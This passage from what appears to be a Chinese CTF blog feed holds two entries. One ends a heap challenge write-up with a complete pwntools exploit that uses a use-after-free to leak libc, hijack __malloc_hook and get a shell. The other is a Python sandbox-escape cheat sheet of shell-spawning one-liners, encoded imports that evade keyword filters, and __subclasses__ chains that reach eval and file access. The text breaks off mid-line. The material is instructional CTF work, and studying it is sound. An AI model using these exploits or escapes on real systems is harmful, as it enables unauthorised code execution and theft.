else</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (char *)malloc(size + 1);</span><br><span class="line">      if ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Malloc Failed, Error&quot;);</span><br><span class="line">        free(ptr);</span><br><span class="line">        return __readfsqword(0x28u) ^ v6;</span><br><span class="line">      &#125;</span><br><span class="line">      strncpy(dest, &amp;s2, size + 1);</span><br><span class="line">      ptr-&gt;size = size;</span><br><span class="line">      ptr-&gt;chunk_ptr = (__int64)dest;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      if ( ptrStart )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">        last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = 0;</span><br><span class="line">        ptrStart = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Success, index: %d\n&quot;, (unsigned int)ptr-&gt;idx);</span><br><span class="line">    return __readfsqword(0x28u) ^ v6;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Malloc Failed,Error&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这个程序的问题在于分配chunk时，会检查内容是否相同，如果相同的话，就不再多分配chunk，只会分配结构体 chunk然后将其中的指针指向已知的chunk，也就会出现两个指针指向同一个chunk，我们就可以UAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br></pre></td></tr></table></figure><p>而其实这就已经是极大的漏洞了，利用这个洞完全可以泄露libc然后覆盖fd指针到malloc_hook， one_gadget 一把梭getshell</p><p><em>完全没必要总去想着控制链表指针什么的…费力不讨好</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./pwn&apos;)</span><br><span class="line">#sh=remote(&apos;&apos;)#(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,&apos;58512&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">def new(con):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;data:\n&apos;,con)</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;b&apos;*8)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line"></span><br><span class="line">new(&apos;e&apos;*0x20)</span><br><span class="line"></span><br><span class="line">#----------------leak heap base------------------------------//没有必要， 所以其实可以更短</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line">show(1)</span><br><span class="line">heap = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x60</span><br><span class="line">print hex(heap)</span><br><span class="line"></span><br><span class="line">new(&apos;d&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">#---------------leak libc base-----------------------------</span><br><span class="line">dele(3)</span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-88-0x3c4b20</span><br><span class="line">print hex(libc)</span><br><span class="line">one = libc+0x4526a</span><br><span class="line">print hex(one)</span><br><span class="line"></span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line"></span><br><span class="line">#------------------hjack malloc_hook to getshell-----------</span><br><span class="line">dele(5)</span><br><span class="line">edit(6,p64(libc+0x3c4b20-0x33))</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;a&apos;*0x13+p64(one)+p64(0)*9)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Escape from python-jail</title>
      <link href="/2019/04/08/escape-from-python-jail/"/>
      <url>/2019/04/08/escape-from-python-jail/</url>
      <content type="html"><![CDATA[<h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p><p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p><h2 id="关于查看目标主机是否为docker"><a href="#关于查看目标主机是否为docker" class="headerlink" title="关于查看目标主机是否为docker"></a>关于查看目标主机是否为docker</h2><ol><li>cat /proc/self/cgroup</li><li>mount -v</li></ol><h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0"><li><strong>import</strong> 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;dir&apos;)</span><br></pre></td></tr></table></figure><ol><li>os 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">os.popen(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>很少不被禁，不然很容易被利用getshell<br>官方文档 <a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">https://docs.python.org/2/library/os.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&quot;/bin/sh&quot;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="2"><li>exec &amp; eval 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br></pre></td></tr></table></figure><p>两个执行函数，没什么可说的。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure></p><ol start="3"><li>execfile 函数</li></ol><p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p><ol start="4"><li>timeit 函数 from timeit 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure><ol start="5"><li>platform 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure><ol start="7"><li>commands 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">print commands.getstatusoutput(&quot;dir&quot;)</span><br></pre></td></tr></table></figure><p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">flag  jail.py</span><br><span class="line">&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)</span><br><span class="line">(0, &apos;flag  jail.py&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>subprocess模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call([&apos;ls&apos;],shell=True)</span><br></pre></td></tr></table></figure><p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)</span><br><span class="line">flag  jail.py</span><br></pre></td></tr></table></figure><ol start="9"><li>compile 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>菜鸟：<a href="http://www.runoob.com/python/python-func-compile.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-compile.html</a></p><ol start="10"><li>f修饰符</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure><p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ol><li>file 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="2"><li>open 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&apos;flag.txt&apos;).read()</span><br></pre></td></tr></table></figure><ol start="3"><li><p>codecs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&apos;test.txt&apos;).read()</span><br></pre></td></tr></table></figure></li><li><p>Filetype 函数 from types 模块</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure><p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p><p>关于python内部查看版本号，可以使用sys模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure><h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><p>使用内联函数：</p><ol><li><strong>import</strong>函数</li></ol><p><strong>import</strong>函数本身是用来动态的导入模块，比如：<strong>import</strong>(module) == import module</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(&quot;bf&quot;.decode(&apos;rot_13&apos;))       //os </span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><p>importlib库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">a = importlib.import_module(&quot;bf&quot;.decode(&apos;rot_13&apos;))    //os</span><br><span class="line">a.system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>builtins</strong>函数</li></ol><p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure><p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p><p>一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”],我们就可以用一些编码来绕过字符明文检测。</p><p>所以可以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;sh&apos;)   == __builtins__.__dict__[_import__](&apos;os&apos;).system(&apos;sh&apos;)</span><br></pre></td></tr></table></figure></p><ol start="3"><li>路径引入os等模块</li></ol><p>因为一般都是禁止引入敏感包，当禁用os时，实际上就是  sys.modules[‘os’]=None</p><p>而因为一般的类unix系统的python os路径都是/usr/lib/python2.7/os.py  ,所以可以通过路径引入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos;</span><br></pre></td></tr></table></figure><ol start="4"><li>reload</li></ol><p>禁止引用某些函数时，可能会删除掉一些函数的引用,比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&apos;__import__&apos;]</span><br></pre></td></tr></table></figure></p><p>这样就无法再引入，但是我们可以用 reload(<strong>builtins</strong>) 重载<strong>builtins</strong>模块恢复内置函数</p><p>但是reload本身也是<strong>builtins</strong>模块的函数，其本身也可能会被禁掉</p><p>在可以引用包的情况下，我们还可以使用imp模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import __builtins__</span><br><span class="line">import imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure><p>这样就可以得到完整的<strong>builtins</strong>模块了，需要注意的是需要先import <strong>builtins</strong> ,如果不写的话，虽然<strong>builtins</strong>模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import __builtins__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</span><br></pre></td></tr></table></figure><p>再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？<br>可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>函数名字符串扫描过滤的绕过</li></ol><p>假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作</p><p>这里就可以使用： getattr &amp;&amp; <strong>getattribute</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(&quot;os&quot;),&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">getattr(__import__(&quot;os&quot;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).__getattribute__(&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)</span><br></pre></td></tr></table></figure><p>runoob ：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。</span><br><span class="line">如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。</span><br></pre></td></tr></table></figure></p><h3 id="object-命令引入执行"><a href="#object-命令引入执行" class="headerlink" title="object 命令引入执行"></a>object 命令引入执行</h3><p>object 类中集成了很多基础函数，我们也可以用object来进行调用的操作</p><p>对于字符串对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &apos;object&apos;&gt;,)</span><br></pre></td></tr></table></figure></p><p>通过<strong>base</strong>方法可以获取上一层继承关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure><p>通过<strong>mro</strong>方法获取继承关系</p><p>所以最常见的创建object对象的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>在获取之后，返回的是一个元组，通过下标+<strong>subclasses</strong>的方法可以获取所有子类的列表。而<strong>subclasses</strong>()第40个是file类型的object。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>所以可以读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;jail.py&quot;).read()</span><br></pre></td></tr></table></figure></p><p>同时写文件或执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;,&quot;w&quot;).write(&quot;1111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;jail.py&quot;).read()&apos; )</span><br></pre></td></tr></table></figure></p><p>可以执行命令寻找subclasses下引入过os模块的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from 